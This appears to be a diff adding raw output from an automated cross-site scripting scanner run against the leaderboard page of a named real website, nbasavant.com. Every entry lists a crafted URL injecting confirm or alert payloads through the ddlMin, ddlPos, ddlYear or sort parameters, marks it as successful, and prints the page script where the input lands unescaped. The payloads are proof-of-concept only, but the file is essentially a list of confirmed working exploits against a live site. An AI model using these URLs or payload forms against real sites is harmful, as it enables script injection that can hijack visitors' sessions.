@@ -1,0 +1,208 @@
+DirectGetParams/nbasavant.com
+
+http://nbasavant.com/leaderboard.php?ddlMin='; confirm`1`; '&ddlPos=&ddlTeam=&ddlYear=2014&sort=aaaaaaa
+Context = SCRIPT
+Success = TRUE
+Detection:
+<script>            
+            $("#ddlMin").val(''; confirm`1`; '').attr('selected',true);
+        </script>
+
+-----------------------------------------------------------------------------------------------------
+http://nbasavant.com/leaderboard.php?ddlMin=</script><script>alert`1`</script>&ddlPos=&ddlTeam=&ddlYear=2014&sort=aaaaaaa
+Context = SCRIPT
+Success = TRUE
+Detection:
+<script>            
+            $("#ddlMin").val('</script><script>alert`1`</script>').attr('selected',true);
+        </script>
+
+-----------------------------------------------------------------------------------------------------
+http://nbasavant.com/leaderboard.php?ddlMin=500&ddlPos='; confirm`1`; '&ddlTeam=&ddlYear=2014&sort=aaaaaaa
+Context = SCRIPT
+Success = TRUE
+Detection:
+<script>            
+            $("#ddlPos").val(''; confirm`1`; '').attr('selected',true);
+        </script>
+<script>
+    var currentSort = 'aaaaaaa';
+    $(document).ready(function(){
+                $('#btnUpdate').click(function() {
+           window.location = 'leaderboard.php?ddlYear=' + $('#ddlYear').val() + '&ddlMin=' + $('#ddlMin').val() + '&ddlTeam=' + $('#ddlTeam').val() +'&ddlPos=' + $('#ddlPos').val() + '&sort=' + currentSort; 
+        });
+        $('#btnClear').click(function() {
+           window.location = 'leaderboard.php';            
+        });        
+        $('#link').click(function() {
+           window.location = 'leaderboard.php?ddlYear=2014&ddlMin=500&ddlTeam=&ddlPos='; confirm`1`; '&sort=' + currentSort;             
+        });
+    });
+</script>
+
+-----------------------------------------------------------------------------------------------------
+http://nbasavant.com/leaderboard.php?ddlMin=500&ddlPos=</script><script>alert`1`</script>&ddlTeam=&ddlYear=2014&sort=aaaaaaa
+Context = SCRIPT
+Success = TRUE
+Detection:
+<script>            
+            $("#ddlPos").val('</script><script>alert`1`</script>').attr('selected',true);
+        </script>
+<script>
+    var currentSort = 'aaaaaaa';
+    $(document).ready(function(){
+                $('#btnUpdate').click(function() {
+           window.location = 'leaderboard.php?ddlYear=' + $('#ddlYear').val() + '&ddlMin=' + $('#ddlMin').val() + '&ddlTeam=' + $('#ddlTeam').val() +'&ddlPos=' + $('#ddlPos').val() + '&sort=' + currentSort; 
+        });
+        $('#btnClear').click(function() {
+           window.location = 'leaderboard.php';            
+        });        
+        $('#link').click(function() {
+           window.location = 'leaderboard.php?ddlYear=2014&ddlMin=500&ddlTeam=&ddlPos=</script><script>alert`1`</script>&sort=' + currentSort;             
+        });
+    });
+</script>
+
+-----------------------------------------------------------------------------------------------------
+http://nbasavant.com/leaderboard.php?ddlMin=500&ddlPos='; confirm`1`; '&ddlTeam=&ddlYear=2014&sort=aaaaaaa
+Context = SCRIPT
+Success = TRUE
+Detection:
+<script>            
+            $("#ddlPos").val(''; confirm`1`; '').attr('selected',true);
+        </script>
+<script>
+    var currentSort = 'aaaaaaa';
+    $(document).ready(function(){
+                $('#btnUpdate').click(function() {
+           window.location = 'leaderboard.php?ddlYear=' + $('#ddlYear').val() + '&ddlMin=' + $('#ddlMin').val() + '&ddlTeam=' + $('#ddlTeam').val() +'&ddlPos=' + $('#ddlPos').val() + '&sort=' + currentSort; 
+        });
+        $('#btnClear').click(function() {
+           window.location = 'leaderboard.php';            
+        });        
+        $('#link').click(function() {
+           window.location = 'leaderboard.php?ddlYear=2014&ddlMin=500&ddlTeam=&ddlPos='; confirm`1`; '&sort=' + currentSort;             
+        });
+    });
+</script>
+
+-----------------------------------------------------------------------------------------------------
+http://nbasavant.com/leaderboard.php?ddlMin=500&ddlPos=</script><script>alert`1`</script>&ddlTeam=&ddlYear=2014&sort=aaaaaaa
+Context = SCRIPT
+Success = TRUE
+Detection:
+<script>            
+            $("#ddlPos").val('</script><script>alert`1`</script>').attr('selected',true);
+        </script>
+<script>
+    var currentSort = 'aaaaaaa';
+    $(document).ready(function(){
+                $('#btnUpdate').click(function() {
+           window.location = 'leaderboard.php?ddlYear=' + $('#ddlYear').val() + '&ddlMin=' + $('#ddlMin').val() + '&ddlTeam=' + $('#ddlTeam').val() +'&ddlPos=' + $('#ddlPos').val() + '&sort=' + currentSort; 
+        });
+        $('#btnClear').click(function() {
+           window.location = 'leaderboard.php';            
+        });        
+        $('#link').click(function() {
+           window.location = 'leaderboard.php?ddlYear=2014&ddlMin=500&ddlTeam=&ddlPos=</script><script>alert`1`</script>&sort=' + currentSort;             
+        });
+    });
+</script>
+
+-----------------------------------------------------------------------------------------------------
+http://nbasavant.com/leaderboard.php?ddlMin=500&ddlPos=&ddlTeam=&ddlYear='; confirm`1`; '&sort=aaaaaaa
+Context = SCRIPT
+Success = TRUE
+Detection:
+<script>            
+            $("#ddlYear").val(''; confirm`1`; '').attr('selected',true);
+        </script>
+
+-----------------------------------------------------------------------------------------------------
+http://nbasavant.com/leaderboard.php?ddlMin=500&ddlPos=&ddlTeam=&ddlYear=</script><script>alert`1`</script>&sort=aaaaaaa
+Context = SCRIPT
+Success = TRUE
+Detection:
+<script>            
+            $("#ddlYear").val('</script><script>alert`1`</script>').attr('selected',true);
+        </script>
+
+-----------------------------------------------------------------------------------------------------
+http://nbasavant.com/leaderboard.php?ddlMin=500&ddlPos=&ddlTeam=&ddlYear=2014&sort='; confirm`1`; '
+Context = SCRIPT
+Success = TRUE
+Detection:
+<script>
+    var currentSort = ''; confirm`1`; '';
+    $(document).ready(function(){
+                    $.tablesorter.addWidget({
+                id: "numbering",
+                format: function(table) {
+                    var c = table.config;
+                    $("tr:visible", table.tBodies[0]).each(function(i) {
+                        $(this).find('td').eq(0).text(i + 1);
+                    });
+                }
+            });                
+            $('#tblLeaderboard').tablesorter(
+            {                    
+                headers: {
+                    0: { sorter: false }
+                },
+                sortList: [['; confirm`1`; ']],
+                // apply custom widget
+                widgets: ['numbering']
+            });
+            
+            $("#tblLeaderboard").bind("sortStart",function() { 
+                $('.show_row').remove();
+            }).bind("sortEnd",function() { 
+                $('.show_row').remove();
+            }).bind("sortEnd", function(sorter) {
+                currentSort = sorter.target.config.sortList;
+            });                    
+                    
+            $('.tablesorter tbody tr').mouseover(function() {
+               $(this).addClass("over"); 
+            }).mouseout(function()
+            {
+                $(this).removeClass("over");
+            }
+        );
+                $('#btnUpdate').click(function() {
+           window.location = 'leaderboard.php?ddlYear=' + $('#ddlYear').val() + '&ddlMin=' + $('#ddlMin').val() + '&ddlTeam=' + $('#ddlTeam').val() +'&ddlPos=' + $('#ddlPos').val() + '&sort=' + currentSort; 
+        });
+        $('#btnClear').click(function() {
+           window.location = 'leaderboard.php';            
+        });        
+        $('#link').click(function() {
+           window.location = 'leaderboard.php?ddlYear=2014&ddlMin=500&ddlTeam=&ddlPos=&sort=' + currentSort;             
+        });
+    });
+</script>
+
+-----------------------------------------------------------------------------------------------------
+http://nbasavant.com/leaderboard.php?ddlMin=500&ddlPos=&ddlTeam=&ddlYear=2014&sort=</script><script>alert`1`</script>
+Context = SCRIPT
+Success = TRUE
+Detection:
+<script>
+    var currentSort = '</script><script>alert`1`</script>';
+    $(document).ready(function(){
+                    $.tablesorter.addWidget({
+                id: "numbering",
+                format: function(table) {
+                    var c = table.config;
+                    $("tr:visible", table.tBodies[0]).each(function(i) {
+                        $(this).find('td').eq(0).text(i + 1);
+                    });
+                }
+            });                
+            $('#tblLeaderboard').tablesorter(
+            {                    
+                headers: {
+                    0: { sorter: false }
+                },
+                sortList: [[</script>
+
+-----------------------------------------------------------------------------------------------------
